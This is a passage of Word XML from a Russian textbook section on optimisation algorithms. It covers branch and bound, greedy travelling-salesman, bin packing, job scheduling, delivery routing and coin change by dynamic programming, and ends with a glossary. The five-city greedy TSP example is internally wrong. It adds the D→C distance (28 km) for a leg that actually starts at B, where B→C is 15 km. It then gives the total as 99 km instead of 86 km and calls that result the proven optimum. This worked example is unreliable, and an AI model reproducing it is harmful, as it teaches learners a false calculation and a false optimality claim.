        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Построить дерево решений (ветвление)</w:t>
        <w:br/>
        <w:t>2. Для каждой ветки оценить нижнюю/верхнюю границу (bound)</w:t>
        <w:br/>
        <w:t>3. Если ветка заведомо хуже текущего лучшего решения — отсечь (pruning)</w:t>
        <w:br/>
        <w:t>4. Продолжать до нахождения оптимума</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Задача коммивояжёра (TSP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4 города, расстояния:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>|     | A   | B   | C   | D   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| --- | --- | --- | --- | --- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A   | 0   | 10  | 15  | 20  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B   | 10  | 0   | 35  | 25  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C   | 15  | 35  | 0   | 30  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| D   | 20  | 25  | 30  | 0   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Найти кратчайший маршрут, проходящий через все города и возвращающийся в A.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод ветвей и границ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Начинаем с A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ветвимся: A→B, A→C, A→D</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Для каждой ветки оцениваем нижнюю границу (минимально возможную длину пути)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если нижняя граница больше текущего лучшего решения — отсекаем ветку</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Продолжаем до нахождения оптимума</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оптимальный маршрут A→B→D→C→A (длина 10+25+30+15=80).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Находит точное решение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрее полного перебора (за счёт отсечений)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всё равно может быть медленным для больших задач</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует хорошей оценки границ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда нужен точный оптимум, но задача слишком большая для полного перебора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4.5. Примеры решения задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Задача коммивояжёра (TSP) — жадный алгоритм</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5 городов, найти кратчайший маршрут.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расстояния (км):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>|     | A   | B   | C   | D   | E   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| --- | --- | --- | --- | --- | --- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A   | 0   | 29  | 20  | 21  | 16  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B   | 29  | 0   | 15  | 17  | 28  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C   | 20  | 15  | 0   | 28  | 40  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| D   | 21  | 17  | 28  | 0   | 18  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| E   | 16  | 28  | 40  | 18  | 0   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный алгоритм (nearest neighbor):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Начинаем с A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ближайший город к A: E (16 км)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ближайший непосещённый к E: D (18 км)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ближайший непосещённый к D: B (17 км)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Остался C: D→C (28 км)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Возвращаемся в A: C→A (20 км)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Маршрут:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> A → E → D → B → C → A  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 16 + 18 + 17 + 28 + 20 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>99 км</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимальный маршрут</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (найден полным перебором или методом ветвей и границ): A → E → D → B → C → A = 99 км.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> В этом случае жадный алгоритм дал оптимум (повезло).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Задача о размещении (Bin Packing)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Есть коробки весом 4, 8, 1, 4, 2, 1 кг. Контейнер вмещает 10 кг. Какое минимальное количество контейнеров нужно?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный алгоритм First Fit (первый подходящий):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём первую коробку (4 кг), кладём в контейнер 1 (остаток 6 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 8 кг — не помещается в контейнер 1, создаём контейнер 2 (остаток 2 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 1 кг — помещается в контейнер 1 (остаток 5 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 4 кг — помещается в контейнер 1 (остаток 1 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 2 кг — помещается в контейнер 2 (остаток 0 кг)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 1 кг — помещается в контейнер 1 (остаток 0 кг)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 2 контейнера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Контейнер 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4 + 1 + 4 + 1 = 10 кг  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Контейнер 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 8 + 2 = 10 кг</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимум:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 2 контейнера (жадный алгоритм дал оптимум).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Задача планирования расписания (Scheduling)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Есть 5 задач с временем выполнения. Один процессор. Минимизировать среднее время ожидания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Задача | Время (мин) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ------ | ----------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A      | 5           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B      | 2           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C      | 8           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| D      | 1           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| E      | 3           |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный алгоритм (Shortest Job First — SJF):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сортируем задачи по времени:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>D (1) → B (2) → E (3) → A (5) → C (8)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расписание:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Задача | Начало | Конец | Время ожидания |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ------ | ------ | ----- | -------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| D      | 0      | 1     | 0              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B      | 1      | 3     | 1              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| E      | 3      | 6     | 3              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A      | 6      | 11    | 6              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C      | 11     | 19    | 11             |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Среднее время ожидания:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (0 + 1 + 3 + 6 + 11) / 5 = 21 / 5 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4.2 минуты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимум:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4.2 минуты (SJF даёт оптимум для минимизации среднего времени ожидания).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Задача оптимизации маршрута доставки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Курьер доставляет 3 посылки по адресам A, B, C. Найти оптимальный маршрут.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расстояния (км):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>|      | Склад | A   | B   | C   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ---- | ----- | --- | --- | --- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Склад| 0     | 5   | 10  | 15  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A    | 5     | 0   | 6   | 9   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B    | 10    | 6   | 0   | 8   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C    | 15    | 9   | 8   | 0   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Возможные маршруты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Склад → A → B → C → Склад: 5 + 6 + 8 + 15 = 34 км</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Склад → A → C → B → Склад: 5 + 9 + 8 + 10 = 32 км</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Склад → B → A → C → Склад: 10 + 6 + 9 + 15 = 40 км</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Склад → B → C → A → Склад: 10 + 8 + 9 + 5 = 32 км</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Склад → C → A → B → Склад: 15 + 9 + 6 + 10 = 40 км</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Склад → C → B → A → Склад: 15 + 8 + 6 + 5 = 34 км</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимальный маршрут:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Склад → A → C → B → Склад (32 км) или Склад → B → C → A → Склад (32 км).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Задача о смене валюты (динамическое программирование)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выдать сдачу 11 рублей монетами номиналом 1, 3, 4 рубля. Минимизировать количество монет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 4 ₽ (остаток 7 ₽)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 4 ₽ (остаток 3 ₽)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём 3 ₽ (остаток 0 ₽)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 3 монеты (4 + 4 + 3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимальное решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3 + 4 + 4 = 11 ₽ → 3 монеты (жадный дал оптимум).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Но попробуем другой пример: сдача 6 ₽, номиналы 1, 3, 4.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4 + 1 + 1 = 3 монеты  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимум:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 3 + 3 = 2 монеты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Жадный алгоритм не всегда оптимален. Нужно ДП.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динамическое программирование:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dp[0] = 0  (для 0 ₽ нужно 0 монет)</w:t>
        <w:br/>
        <w:t>dp[1] = 1  (1 монета номиналом 1)</w:t>
        <w:br/>
        <w:t>dp[2] = 2  (1 + 1)</w:t>
        <w:br/>
        <w:t>dp[3] = 1  (1 монета номиналом 3)</w:t>
        <w:br/>
        <w:t>dp[4] = 1  (1 монета номиналом 4)</w:t>
        <w:br/>
        <w:t>dp[5] = min(dp[4]+1, dp[2]+1) = min(2, 3) = 2  (4 + 1)</w:t>
        <w:br/>
        <w:t>dp[6] = min(dp[5]+1, dp[3]+1, dp[2]+1) = min(3, 2, 3) = 2  (3 + 3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Минимум 2 монеты (3 + 3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Функциональная задача</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — задача с чётко определённой целью, входными данными и ожидаемым результатом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель "чёрного ящика"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, где важен только вход и выход, а внутреннее устройство не имеет значения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритмическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, представленная в виде пошагового алгоритма.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эвристическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, использующая приближённые методы (эвристики) для получения "достаточно хорошего" решения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимизационная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель, направленная на поиск наилучшего решения среди множества допустимых вариантов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Система</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — совокупность взаимосвязанных элементов, работающих вместе для достижения общей цели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Системный подход</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — метод решения задач, при котором задача рассматривается как система.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Декомпозиция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — разбиение сложной задачи на подзадачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Анализ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — исследование системы путём разбора её на части.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтез</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сборка системы из элементов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эмерджентность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — свойство системы, которого нет у отдельных элементов ("целое больше суммы частей").</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод проб и ошибок (Trial and Error)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — перебор вариантов до нахождения подходящего.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод "Разделяй и властвуй" (Divide and Conquer)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — разбиение задачи на подзадачи, решение каждой независимо, объединение результатов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Жадный алгоритм (Greedy Algorithm)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм, делающий локально оптимальный выбор на каждом шаге.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динамическое программирование (Dynamic Programming)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — метод решения задач через запоминание результатов подзадач (мемоизация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод ветвей и границ (Branch and Bound)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — перебор решений с отсечением заведомо неоптимальных веток.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача коммивояжёра (Traveling Salesman Problem, TSP)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — задача поиска кратчайшего маршрута, проходящего через все города.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача о рюкзаке (Knapsack Problem)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — задача выбора предметов для максимизации ценности при ограничении по весу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача размещения (Bin Packing)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — задача размещения объектов в минимальное количество контейнеров.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача планирования расписания (Scheduling)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — задача оптимального распределения задач во времени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
